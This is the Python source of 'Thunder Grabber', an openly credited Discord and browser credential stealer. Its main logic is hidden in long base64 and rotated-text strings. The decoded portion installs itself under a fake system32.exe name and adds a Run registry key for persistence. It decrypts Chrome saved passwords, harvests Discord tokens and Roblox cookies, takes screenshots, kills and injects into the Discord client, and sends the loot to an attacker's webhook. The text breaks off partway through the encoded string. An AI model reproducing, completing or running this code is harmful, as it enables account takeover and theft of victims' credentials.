#Thunder Grabber Was Made BY TWISTX7#9122
#https://github.com/TWIST-X7/Thunder-Grabber
import requests
import os
import json
import base64
import winreg
import shutil
import psutil
import random
import zipfile
import socket
import sqlite3
import codecs
import platform
import win32crypt
import subprocess
import sys
import httpx

from Cryptodome.Cipher import AES
from subprocess import PIPE, Popen
from win32crypt import CryptUnprotectData
from PIL import ImageGrab
from json import load
from sys import argv
from threading import Thread
from re import findall, match
from urllib.request import urlopen
from discord import File, Webhook, RequestsWebhookAdapter
from discord_webhook import DiscordWebhook, DiscordEmbed
from getmac import get_mac_address as gma

weblink = "YOUR_WEBHOOK"
#The injection Was Mad By Rdimo#6968
injection = "YES_NO"

magic = 'bG9jYXRpb24gPSBvcy5lbnZpcm9uWyJhcHBkYXRhIl0gKyAiXFxzeXN0ZW0zMi5leGUiDQppZiBub3Qgb3MucGF0aC5leGlzdHMobG9jYXRpb24pOg0KICAgIHNodXRpbC5jb3B5ZmlsZShzeXMuZXhlY3V0YWJsZSwgbG9jYXRpb24pDQogICAgc3VicHJvY2Vzcy5jYWxsKCdyZWcgYWRkIEhLQ1Vcc29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIC92IEdyYWJiZXIgL3QgUkVHX1NaIC9kICInICsgbG9jYXRpb24gKyAnIicsIHNoZWxsPVRydWUpDQoNCg0KY2xhc3Mgc3B5d2FyZToNCiAgICBpcCA9ICIiDQogICAgY3VycmVudF91c2VyID0gIiINCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5pcCA9ICIiDQogICAgICAgIHNlbGYuY3VycmVudF91c2VyID0gIiINCiAgICANCiAgICBkZWYgZmV0Y2hfZW5jcnlwdGlvbl9rZXkoc2VsZik6DQogICAgICAgIGxvY2FsX2NvbXB1dGVyX2RpcmVjdG9yeV9wYXRoID0gb3MucGF0aC5qb2luKA0KICAgICAgICBvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJHb29nbGUiLCAiQ2hyb21lIiwgDQogICAgICAgICJVc2VyIERhdGEiLCAiTG9jYWwgU3RhdGUiKQ0KICAgICAgICANCiAgICAgICAgd2l0aCBvcGVuKGxvY2FsX2NvbXB1dGVyX2RpcmVjdG9yeV9wYXRoLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6DQogICAgICAgICAgICBsb2NhbF9zdGF0ZV9kYXRhID0gZi5yZWFkKCkNCiAgICAgICAgICAgIGxvY2FsX3N0YXRlX2RhdGEgPSBqc29uLmxvYWRzKGxvY2FsX3N0YXRlX2RhdGEpDQogICAgDQogICAgICAgIGVuY3J5cHRpb25fa2V5ID0gYmFzZTY0LmI2NGRlY29kZSgNCiAgICAgICAgbG9jYWxfc3RhdGVfZGF0YVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQ0KICAgICAgICBlbmNyeXB0aW9uX2tleSA9IGVuY3J5cHRpb25fa2V5WzU6XQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIHdpbjMyY3J5cHQuQ3J5cHRVbnByb3RlY3REYXRhKGVuY3J5cHRpb25fa2V5LCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQ0KICAgDQogICAgZGVmIGRlY3J5cHRfcGFzc3dvcmRzKHNlbGYsIHBhc3N3b3JkLCBlbmNyeXB0aW9uX2tleSk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGl2ID0gcGFzc3dvcmRbMzoxNV0NCiAgICAgICAgICAgIHBhc3N3b3JkID0gcGFzc3dvcmRbMTU6XQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICBjaXBoZXIgPSBBRVMubmV3KGVuY3J5cHRpb25fa2V5LCBBRVMuTU9ERV9HQ00sIGl2KSAgICAgICAgICAgIA0KICAgICAgICAgICAgcmV0dXJuIGNpcGhlci5kZWNyeXB0KHBhc3N3b3JkKVs6LTE2XS5kZWNvZGUoKQ0KICAgICAgICBleGNlcHQ6ICAgIA0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHJldHVybiBzdHIod2luMzJjcnlwdC5DcnlwdFVucHJvdGVjdERhdGEocGFzc3dvcmQsIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdKQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIHJldHVybiAiTm8gUGFzc3dvcmRzIg0KDQogICAgZGVmIGdldF9wYXNzd29yZHMoc2VsZik6DQogICAgICAgIGZpbmFsX2FucyA9ICJcbkNocm9tZSBQYXNzd29yZHM6XG4iDQogICAgICAgIGtleSA9IHNlbGYuZmV0Y2hfZW5jcnlwdGlvbl9rZXkoKQ0KICAgICAgICBkYl9wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiR29vZ2xlIiwgIkNocm9tZSIsICJVc2VyIERhdGEiLCAiZGVmYXVsdCIsICJMb2dpbiBEYXRhIikNCiAgICAgICAgDQogICAgICAgIGZpbGVuYW1lID0gIkNocm9tZVBhc3N3b3Jkcy5kYiINCiAgICAgICAgc2h1dGlsLmNvcHlmaWxlKGRiX3BhdGgsIGZpbGVuYW1lKSAgICAgICAgDQogICAgICAgIGRiID0gc3FsaXRlMy5jb25uZWN0KGZpbGVuYW1lKQ0KICAgICAgICBjdXJzb3IgPSBkYi5jdXJzb3IoKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICBjdXJzb3IuZXhlY3V0ZSgNCiAgICAgICAgICAgICJzZWxlY3Qgb3JpZ2luX3VybCwgYWN0aW9uX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlLCBkYXRlX2NyZWF0ZWQsIGRhdGVfbGFzdF91c2VkIGZyb20gbG9naW5zICINCiAgICAgICAgICAgICJvcmRlciBieSBkYXRlX2xhc3RfdXNlZCIpDQogICAgICAgIA0KICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOg0KICAgICAgICAgICAgbWFpbl91cmwgPSByb3dbMF0NCiAgICAgICAgICAgIGxvZ2luX3VybCA9IHJvd1sxXQ0KICAgICAgICAgICAgdXNlcm5hbWUgPSByb3dbMl0NCiAgICAgICAgICAgIHBhc3N3b3JkID0gc2VsZi5kZWNyeXB0X3Bhc3N3b3Jkcyhyb3dbM10sIGtleSkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgdXNlcm5hbWUgb3IgcGFzc3dvcmQ6ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgZmluYWxfYW5zICs9IGYiTWFpbiBVUkw6IHttYWluX3VybH1cbiINCiAgICAgICAgICAgICAgICBmaW5hbF9hbnMgKz0gZiJMb2dpbiBVUkw6IHtsb2dpbl91cmx9XG4iDQogICAgICAgICAgICAgICAgZmluYWxfYW5zICs9IGYiVXNlcm5hbWU6IHt1c2VybmFtZX1cbiINCiAgICAgICAgICAgICAgICBmaW5hbF9hbnMgKz0gZiJQYXNzd29yZDoge3Bhc3N3b3JkfVxuXG4iDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQoNCiAgICAgICAgICAgIGZpbmFsX2FucyArPSAiPSIgKiA4MCArICJcblxuIg0KDQogICAgICAgIGN1cnNvci5jbG9zZSgpDQogICAgICAgIGRiLmNsb3NlKCkNCiAgICAgICAgDQogICAgICAgIHRyeTogICAgICAgICAgICANCiAgICAgICAgICAgIG9zLnJlbW92ZShmaWxlbmFtZSkNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgcGFzcw0KDQogICAgICAgIHJldHVybiBmaW5hbF9hbnMNCg0KICAgIGRlZiBnZXRfc3lzdGVtX2luZm8oc2VsZik6DQogICAgICAgIGZpbmFsX3N0ciA9ICJcblN5c3RlbSBJbmZvcm1hdGlvbjpcbiINCiAgICAgICAgDQogICAgICAgIGRhdGFfZGljdGlvbmFyeSA9IHsiSVAtQWRkcmVzcyIgOiAiIiwgIkhvc3RuYW1lIiA6ICIiLCAiUGxhdGZvcm06IiA6ICIiLCAiUmVsZWFzZS1EYXRhIiA6ICIiLCAiVmVyc2lvbiIgOiAiIiwgIlByb2Nlc3NvciIgOiAiIiwgIkFyY2hpdGVjdHVyZSIgOiAiIiwgIlJhbSIgOiAiIn0NCiAgICAgICAgZGF0YV9kaWN0aW9uYXJ5WyJQbGF0Zm9ybToiXSA9IHBsYXRmb3JtLnN5c3RlbSgpDQogICAgICAgIGRhdGFfZGljdGlvbmFyeVsiUmVsZWFzZS1EYXRhIl0gPSBwbGF0Zm9ybS5yZWxlYXNlKCkNCiAgICAgICAgZGF0YV9kaWN0aW9uYXJ5WyJWZXJzaW9uIl0gPSBwbGF0Zm9ybS52ZXJzaW9uKCkNCiAgICAgICAgZGF0YV9kaWN0aW9uYXJ5WyJBcmNoaXRlY3R1cmUiXSA9IHBsYXRmb3JtLm1hY2hpbmUoKQ0KICAgICAgICBkYXRhX2RpY3Rpb25hcnlbIkhvc3RuYW1lIl0gPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQ0KICAgICAgICBkYXRhX2RpY3Rpb25hcnlbIklQLUFkZHJlc3MiXSA9IHNvY2tldC5nZXRob3N0YnluYW1lKHNvY2tldC5nZXRob3N0bmFtZSgpKQ0KICAgICAgICBkYXRhX2RpY3Rpb25hcnlbIlByb2Nlc3NvciJdID0gcGxhdGZvcm0ucHJvY2Vzc29yKCkNCiAgICAgICAgZGF0YV9kaWN0aW9uYXJ5WyJSYW0iXSA9IHN0cihyb3VuZChwc3V0aWwudmlydHVhbF9tZW1vcnkoKS50b3RhbCAvICgxMDI0LjAgKiozKSkpICsiIEdCIg0KICAgICAgICANCiAgICAgICAgc2VsZi5pcCA9IGRhdGFfZGljdGlvbmFyeVsiSVAtQWRkcmVzcyJdDQogICAgICAgIGZvciBrZXksIHZhbHVlIGluIGRhdGFfZGljdGlvbmFyeS5pdGVtcygpOg0KICAgICAgICAgICAgZmluYWxfc3RyICs9ICJ7fToge31cbiIuZm9ybWF0KGtleSwgdmFsdWUpICAgICAgICAgICAgDQoNCiAgICAgICAgcmV0dXJuIGZpbmFsX3N0cg0KDQogICAgZGVmIGdldF9pbmZvKHNlbGYpOg0KICAgICAgICBzeXN0ZW1faW5mbyA9ICJUSFVOREVSIEdSQUJCRVIgTUFERSBCWSBUV0lTVFg3IzkxMjIgfCBodHRwczovL2dpdGh1Yi5jb20vVFdJU1QtWDciDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHN5c3RlbV9pbmZvICs9IHNlbGYuZ2V0X3N5c3RlbV9pbmZvKCkNCiAgICAgICAgICAgIHN5c3RlbV9pbmZvICs9IHNlbGYuZ2V0X3Bhc3N3b3JkcygpDQoNCiAgICAgICAgICAgIHJldHVybiBzeXN0ZW1faW5mbw0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uOg0KICAgICAgICAgICAgcGFzcw0KICANCiAgDQogICAgDQogICAgICAgIA0KY2xhc3MgZ3JhYmJlcjoNCiAgICANCiAgICBkZWYgX19pbml0X18oc2VsZik6DQoNCiAgICAgICAgc2VsZi5iYXNldXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSINCiAgICAgICAgc2VsZi5hcHBkYXRhID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQ0KICAgICAgICBzZWxmLnJvYW1pbmcgPSBvcy5nZXRlbnYoImFwcGRhdGEiKQ0KICAgICAgICBzZWxmLnJlZ2V4ID0gciJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyN30iLCByIm1mYVwuW1x3LV17ODR9Ig0KICAgICAgICBzZWxmLmVuY3J5cHRlZF9yZWdleCA9IHIiZFF3NHc5V2dYY1E6W14uKlxbJyguKiknXF0uKiRdKiINCiAgICAgICAgc2VsZi50b2tlbnMgPSBbXQ0KICAgICAgICBzZWxmLnJvYmxveGNvb2tpZXMgPSBbXQ0KICAgICAgICBzZWxmLnN0YXJ0dXAgPSBzZWxmLnJvYW1pbmcgKyAiXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydHVwXFwiDQogICAgICAgIHNlbGYuc2VwID0gb3Muc2VwDQogICAgICAgIA0KICAgICAgICAjVGhyZWFkKHRhcmdldD1zZWxmLmtpbGxEaXNjb3JkKS5zdGFydCgpDQogICAgICAgIHNlbGYuYnlwYXNzVG9rZW5Qcm90ZWN0b3IoKQ0KICAgICAgICBzZWxmLmdyYWJUb2tlbnMoKQ0KICAgICAgICBUaHJlYWQodGFyZ2V0PXNlbGYuc2NyZWVuc2hvdCkuc3RhcnQoKQ0KICAgICAgICBzZWxmLmdyYWJSb2Jsb3hDb29raWUoKQ0KICAgICAgICBzZWxmLmtpbGxEaXNjb3JkKCkNCiAgICAgICAgaWYgaW5qZWN0aW9uID09ICJ5IjoNCiAgICAgICAgICAgIHNlbGYuaW5qZWN0b3IoKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcGFzcw0KICAgICAgICBzZWxmLlNlbmRJbmZvKCkNCiAgICAgICAgDQogICAgDQogICAgZGVmIGdldGhlYWRlcnMoc2VsZiwgdG9rZW49Tm9uZSwgY29udGVudF90eXBlPSJhcHBsaWNhdGlvbi9qc29uIik6DQogICAgICAgIGhlYWRlcnMgPSB7DQogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogY29udGVudF90eXBlLA0KICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEiDQogICAgICAgIH0NCiAgICAgICAgaWYgdG9rZW46DQogICAgICAgICAgICBoZWFkZXJzLnVwZGF0ZSh7IkF1dGhvcml6YXRpb24iOiB0b2tlbn0pDQogICAgICAgIHJldHVybiBoZWFkZXJzDQogICAgZGVmIGtpbGxEaXNjb3JkKHNlbGYpOg0KICAgICAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6DQogICAgICAgICAgICBpZiBhbnkocHJvY3N0ciBpbiBwcm9jLm5hbWUoKS5sb3dlcigpIGZvciBwcm9jc3RyIGluDQogICAgICAgICAgICAgICAgICAgWydkaXNjb3JkJywgJ2Rpc2NvcmR0b2tlbnByb3RlY3RvcicsICdkaXNjb3JkY2FuYXJ5JywgJ2Rpc2NvcmRkZXZlbG9wbWVudCcsICdkaXNjb3JkcHRiJ10pOg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgcHJvYy5raWxsKCkNCiAgICAgICAgICAgICAgICBleGNlcHQgKHBzdXRpbC5Ob1N1Y2hQcm9jZXNzLCBwc3V0aWwuQWNjZXNzRGVuaWVkKToNCiAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgIA0KICAgIGRlZiBnZXRfbWFzdGVyX2tleShzZWxmLCBwYXRoKToNCiAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoNCiAgICAgICAgICAgIGxvY2FsX3N0YXRlID0gZi5yZWFkKCkNCiAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGxvY2FsX3N0YXRlKQ0KDQogICAgICAgIG1hc3Rlcl9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0pDQogICAgICAgIG1hc3Rlcl9rZXkgPSBtYXN0ZXJfa2V5WzU6XQ0KICAgICAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdDQogICAgICAgIHJldHVybiBtYXN0ZXJfa2V5DQogICAgDQogICAgDQogICAgDQogICAgZGVmIGluamVjdG9yKHNlbGYpOg0KICAgICAgICBmb3IgX2RpciBpbiBvcy5saXN0ZGlyKHNlbGYuYXBwZGF0YSk6DQogICAgICAgICAgICBpZiAnZGlzY29yZCcgaW4gX2Rpci5sb3dlcigpOg0KICAgICAgICAgICAgICAgIGRpc2NvcmQgPSBzZWxmLmFwcGRhdGErc2VsZi5zZXArX2Rpcg0KICAgICAgICAgICAgICAgIGRpc2Nfc2VwID0gZGlzY29yZCtzZWxmLnNlcA0KICAgICAgICAgICAgICAgIGZvciBfX2RpciBpbiBvcy5saXN0ZGlyKG9zLnBhdGguYWJzcGF0aChkaXNjb3JkKSk6DQogICAgICAgICAgICAgICAgICAgIGlmIG1hdGNoKHInYXBwLShcZCpcLlxkKikqJywgX19kaXIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgYXBwID0gb3MucGF0aC5hYnNwYXRoKGRpc2Nfc2VwK19fZGlyKQ0KICAgICAgICA'
love = 'tVPNtVPNtVPNtVPNtVPNtnJ5dK3OuqTttCFOupUNeW1kpoJ9xqJkyp1kpMTymL29lMS9xMKAeqT9jK2AipzHgZ1kpMTymL29lMS9xMKAeqT9jK2AipzIpKPpAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVT9mYaOuqTthMKucp3EmXTyhny9jLKEbXGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvOmMJkzYaA0LKW0qKNtoz90VTyhVTSlM3MoZS06QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVT9mYz1un2IxnKWmXN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyhny9jLKEbXlqcozy0nJS0nJ9hWljtMKucp3Eso2f9IUW1MFxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtMKuwMKO0VSOypz1cp3Aco25SpaWipwbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOup3ZAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOzVQ0tnUE0pUthM2I0XPqbqUEjpmbiY3Wuql5anKEbqJW1p2IlL29hqTIhqP5wo20iISqWH1DgJQpiFJ5dMJA0nJ9hY21unJ4iFJ5dMJA0nJ9hYJAfMJShYzcmWlxhqTI4qP5lMKOfLJAyXN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNvWIqSDxuCG0fyVvjtq2IvoTyhnlxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO3nKEbVT9jMJ4bnJ5dK3OuqTteW2yhMTI4YzcmWljtW3paYPOypaWipaZ9Vzyaoz9lMFVcVTSmVTyhMTI4EzyfMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnJ5xMKuTnJkyYaqlnKEyXTLcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNto3Zhp3EupaEznJkyXTSjpPNeVUAyoTLhp2IjVPftK2EcpvNeVPphMKuyWlxAPvNtVPNtVPNtVPNtVPN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